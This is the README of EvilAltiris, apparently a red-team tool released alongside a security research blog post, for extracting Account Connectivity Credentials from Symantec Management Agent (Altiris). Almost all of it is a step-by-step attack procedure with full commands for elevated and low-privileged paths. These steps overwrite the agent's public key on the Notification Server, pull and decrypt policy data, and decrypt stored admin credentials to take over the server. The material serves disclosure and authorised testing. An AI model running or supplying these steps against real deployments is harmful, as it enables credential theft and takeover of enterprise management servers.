# EvilAltiris

Tool for extracting Account Connectivity Credentials (ACCs) from Symantec Management Agent (Altiris). In a default configuration, the credentials for the ACC are the same as those used for the Notification Server account. As the Notification Server account must have Local Administator rights on the Notification Server itself, this allows for a full takeover of the server in default installs.

This tool supports two modes of operation, one from an elevated (SYSTEM) process and another from a low privileged (domain user) process.

```
Usage: EvilAltiris <command> <args>

SMATool Commands (requires elevation and SMATool.exe on disk):

SmaGetPublicKey         -       Return the current public key value for the agent from the LDB
SmaGetTypeGuid          -       Fetch the type GUID from a machine joined to Altiris (requires elevation and SMATool.exe on disk)
SmaDecrypt              -       Decrypt encrypted policy data or ACC (requires elevation and SMATool.exe on disk)

Generic Commands (no elevation or SMATool.exe required):

GetClientPolicies       -       Request encrypted policies from Altiris server
GetMachineGuid          -       Read the current machineGuid value from the registry
GenerateKeys            -       Generate a new public / private key pair and policyKey blob
SetPublicKey            -       Overwrite the public key (policyKey) value for an existing machineGuid
DecryptPolicy           -       Decrypt encrypted policy data with private key XML
DecryptAcc              -       Decrypt an encrypted Account Connectivity Credential (ACC) blob
RestoreAgent            -       Force the agent to make a request to CreateResource.aspx to restore the existing agent public key

Arguments:

/smapath        -       Path to SMATool.exe on disk for any SMATool commands
/url            -       Notification Server target including the protocol e.g http://server.local
/key            -       XML string representing a private key for decryption or policyKey value
/data           -       Data to decrypt, can be either a file on disk containing binary data or a base64 string
/machine        -       Machine Guid for the agent
/type           -       Type Guid for the agent
/outfile        -       (Optional) outfile for the returned data

Example usage:

EvilAltiris.exe SmaGetPublicKey /smatool:C:\tools\smatool.exe
EvilAltiris.exe SmaGetTypeGuid /smatool:C:\tools\smatool.exe
EvilAltiris.exe SmaDecrypt /smatool:C:\tools\smatool.exe /data:AAA4xIqgq7WOIYvNqAXSaxh

EvilAltiris.exe GetClientPolicies /url:http://altiris.local /machine:{C07989E4-5473-4856-9752-8907FFCC506A} /type:{493435F7-3B17-4C4C-B07F-C23E7AB7781F}
EvilAltiris.exe GetMachineGuid
EvilAltiris.exe GenerateKeys
EvilAltiris.exe SetPublicKey /key:AAA4xIqgq7WOIYvNqAXSaxh /url:http://altiris.local /machine:{C07989E4-5473-4856-9752-8907FFCC506A}
EvilAltiris.exe DecryptPolicy /key:<RSAKeyValue><Modulus>3F7JlI</D></RSAKeyValue> /data:encrypted_policy.dat
EvilAltiris.exe DecryptAcc /data:AAA4xIqgq7WOIYvNqAXSaxh
EvilAltiris.exe RestoreAgent
```

# Usage

## High Privilege

**Step 1:**

Retrieve the MachineGuid value from the registry.

`EvilAltiris.exe GetMachineGuid`

**Step 2:**

Upload the SMATool.exe binary to the host and fetch the TypeGuid value providing the path on disk to SMATool.exe.

`EvilAltiris.exe SmaGetTypeGuid /smapath:Z:\tools\SMATool.exe`

**Step 3:**

Fetch the encrypted agent policy data from the Notification Server URL providing the `MachineGuid` and `TypeGuid` values from the prior commands. 

**Note**: The server URL can be found within the registry subkey `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Altiris\Altiris Agent\Servers\`

`EvilAltiris.exe GetClientPolicies /url:http://dc.initech.local /machine:{114B7178-2E4E-4071-81DF-919B3F10E0C2} /type:{2c3cb3bb-fee9-48df-804f-90856198b600} /outfile:Z:\policy_data_encrypted.dat`

**Step 4:**

Decrypt the returned agent policy data. A filename or base64 encoded binary blob can be provided.

`EvilAltiris.exe SmaDecrypt /smapath:Z:\tools\SMATool.exe /data:Z:\policy_data_encrypted.dat`

**Step 5:**

Decrypt the encrypted ACC blob contained within the decrypted policy data. The encrypted values are stored within the `userName_Secure_Attribute` and `userPassword_SecureAttribute` XML tags.

`EvilAltiris.exe SmaDecrypt /smapath:Z:\tools\SMATool.exe /data:AwCWjVk9oCVKSGAwMcGdrHee24NhmeSpLOyxpDXmlYRpV+TvK9gHFCvJ0yufRspbKCiov0x410jG1QMn9lpGBx2liuEkfAhAc/NRyFxdgHBrIHJBrnyTewabSkLVItDvfN3XKc9MTG6vaWlFs2aC/y2Z`

## Low Privilege

**Step 1:**

Retrieve the MachineGuid value from the registry.

`EvilAltiris.exe GetMachineGuid`

**Step 2:**

Generate a new public / private key pair and policyKey blob. 

`EvilAltiris.exe GenerateKeys`

**Step 3:**

Overwrite the existing public key (policyKey) value for a given MachineGuid obtained from the previous command. 

**Note**: The server URL can be found within the registry subkey `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Altiris\Altiris Agent\Servers\`

`EvilAltiris.exe SetPublicKey /key:AAAAAQAB6ToNQTGhCxw11elvVzGM9bfDNmqBXxncrbRINgifN5eKbQEHCPyAQTJWU4ayqgQHKpc1157CL7naW6Qyuka5Qx5t0h/k6VgQPwk7YMW4q6d7lZjw6gRXB5g0nfoLh8KOauwOMqEokByNlN4gy92D7bU62WTvyxtnxF/cArP0GVz8aCX45icl9SOKdJ4cXWlZW7kOqyNmAty6y17WaciQXo0Fg6U/Qy+5wc419tyqQyuh1CDeViDa+CY0aVAEqYYohB+D6217wrs/BuO/9gFXcqMsCB10zT9+F9xAG8XXKf1RblKCnGkeObeMYpFC2w85A2DrP5KR0ISBM+X8X8ARsQ== /url:http://dc.initech.local /machine:{D4FB6018-B7A2-4A79-8460-6F933F6127D0}`

**Step 4:**

Fetch the encrypted agent policy data from the Notification Server URL providing the `MachineGuid` and `TypeGuid` values from the prior commands. The `TypeGuid` value can be found in the response data returned from the `SetPublicKey` command.

`EvilAltiris.exe GetClientPolicies /url:http://dc.initech.local /machine:{114B7178-2E4E-4071-81DF-919B3F10E0C2} /type:{2c3cb3bb-fee9-48df-804f-90856198b600} /outfile:C:\Users\domain_user\policy_data_encrypted.dat`

**Step 5:**

Decrypt the returned agent policy data providing the `/key` argument corresponding to the private key value outputted by the `GenerateKeys` command. For `/data` argument a filename or base64 encoded binary blob can be provided.

`EvilAltiris.exe DecryptPolicy /data:C:\Users\domain_user\policy_data_encrypted.dat /key:"<RSAKeyValue></RSAKeyValue>"`

**Step 6:**

Decrypt the encrypted ACC blob contained within the decrypted policy data. The encrypted values are stored within the `userName_Secure_Attribute` and `userPassword_SecureAttribute` XML tags.

`EvilAltiris.exe DecryptAcc /data:AwCWjVk9oCVKSGAwMcGdrHeeGgb3zP+X1URujyeX9sSNCg865meVAxDjjwu7yrMiwtTpaWgLOUhygNQtV0yxThWyn2DDXJqCdz1T9mGG48zII+NNveML/gFuMrvHxS8BJZC+Bd6tdUl9mG7tuYlw5JKLckGufJN7BptKQtUi0O983dcpz0xMbq9paUWzZoL/LZk=`

**Step 7:**

Restore the original public key value currently stored within the LDB on the machine. This will restore the agent to its original state prior to the exploit. 

`EvilAltiris.exe RestoreAgent`

# References
See accompanying blog post here https://www.mdsec.co.uk/2024/12/extracting-account-connectivity-credentials-accs-from-symantec-management-agent-aka-altiris/
